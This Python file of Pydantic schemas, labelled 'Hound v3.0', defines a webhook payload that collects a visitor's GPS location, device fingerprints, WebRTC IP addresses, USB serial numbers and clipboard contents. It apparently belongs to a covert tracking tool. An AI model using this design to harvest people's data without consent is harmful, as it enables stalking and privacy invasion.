"""
Hound v3.0 - Pydantic Models
Data validation schemas for API requests/responses
"""

from pydantic import BaseModel, Field, validator
from typing import Optional, List, Dict, Any
from datetime import datetime


class GPSData(BaseModel):
    """GPS Location Data"""
    latitude: float
    longitude: float
    accuracy: float
    altitude: Optional[float] = None
    heading: Optional[float] = None
    speed: Optional[float] = None
    timestamp: Optional[str] = None


class DeviceInfo(BaseModel):
    """Device Information"""
    platform: str
    os_version: str
    browser: str
    browser_version: str
    device_type: str
    local_time: Optional[str] = None
    timezone: Optional[str] = None


class OrientationData(BaseModel):
    """Device Orientation Data"""
    alpha: float = Field(..., ge=-180, le=360)  # Z rotation
    beta: float = Field(..., ge=-180, le=180)   # X rotation
    gamma: float = Field(..., ge=-90, le=90)    # Y rotation
    timestamp: Optional[str] = None
    
    @validator('alpha', 'beta', 'gamma')
    def validate_angles(cls, v):
        if not isinstance(v, (int, float)):
            raise ValueError('Angle must be numeric')
        return float(v)


class MotionData(BaseModel):
    """Device Motion Data"""
    acceleration: Dict[str, float]
    rotation_rate: Dict[str, float]
    interval: int
    timestamp: Optional[str] = None


class BatteryInfo(BaseModel):
    """Battery Status"""
    level: float = Field(..., ge=0, le=100)
    charging: bool
    charging_time: Optional[float] = None
    discharging_time: Optional[float] = None


class NetworkInfo(BaseModel):
    """Network Information"""
    connection_type: Optional[str] = None
    effective_type: Optional[str] = None
    downlink: Optional[float] = None
    rtt: Optional[float] = None
    save_data: Optional[bool] = None


class Fingerprint(BaseModel):
    """Browser Fingerprint Data"""
    canvas_hash: Optional[str] = None
    webgl_fingerprint: Optional[Dict[str, Any]] = None
    audio_fingerprint: Optional[str] = None
    fonts_signature: Optional[str] = None


class MediaDevice(BaseModel):
    """Media Device Information"""
    device_id: str
    kind: str
    label: str


class USBDevice(BaseModel):
    """USB Device Information"""
    vendor_id: int
    product_id: int
    manufacturer_name: str
    product_name: str
    serial_number: str


class IPInfo(BaseModel):
    """IP and GeoIP Information"""
    ip_address: str
    country: Optional[str] = None
    region: Optional[str] = None
    city: Optional[str] = None
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    isp: Optional[str] = None
    timezone: Optional[str] = None


class WebhookPayload(BaseModel):
    """Complete Webhook Payload"""
    device_info: Optional[DeviceInfo] = None
    battery_info: Optional[BatteryInfo] = None
    gps: Optional[GPSData] = None
    gps_error: Optional[str] = None
    network_info: Optional[NetworkInfo] = None
    ip_info: Optional[IPInfo] = None
    local_ip: Optional[str] = None
    webrtc_public_ip: Optional[str] = None
    orientation: Optional[OrientationData] = None
    motion: Optional[MotionData] = None
    canvas_fingerprint: Optional[str] = None
    webgl_fingerprint: Optional[Dict[str, Any]] = None
    audio_fingerprint: Optional[str] = None
    fonts_signature: Optional[str] = None
    client_rects: Optional[Dict[str, float]] = None
    js_engine: Optional[Dict[str, str]] = None
    media_devices: Optional[List[MediaDevice]] = None
    usb_devices: Optional[List[USBDevice]] = None
    clipboard_data: Optional[str] = None


class WebhookResponse(BaseModel):
    """Webhook Response"""
    status: str
    message: Optional[str] = None
    data_id: Optional[str] = None


class ErrorResponse(BaseModel):
    """Error Response"""
    status: str = "error"
    message: str
    detail: Optional[str] = None
